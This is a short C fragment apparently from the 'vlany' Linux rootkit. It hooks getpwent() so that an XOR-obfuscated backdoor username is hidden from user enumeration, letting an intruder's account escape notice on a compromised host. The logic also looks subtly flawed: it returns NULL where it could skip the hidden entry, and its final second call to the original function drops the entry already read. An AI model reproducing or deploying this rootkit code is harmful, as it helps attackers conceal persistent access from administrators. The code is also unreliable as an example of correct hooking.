struct passwd *getpwent(void)
{
    #ifdef DEBUG
        printf("[vlany] getpwent() called\n");
    #endif

    HOOK(old_getpwent, CGETPWENT);

    struct passwd *tmp = old_getpwent();
    if(tmp && tmp->pw_name != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(tmp->pw_name, vlany_user)) { CLEAN(vlany_user); errno = ESRCH; return NULL; }
        CLEAN(vlany_user);
    }

    return old_getpwent();
}
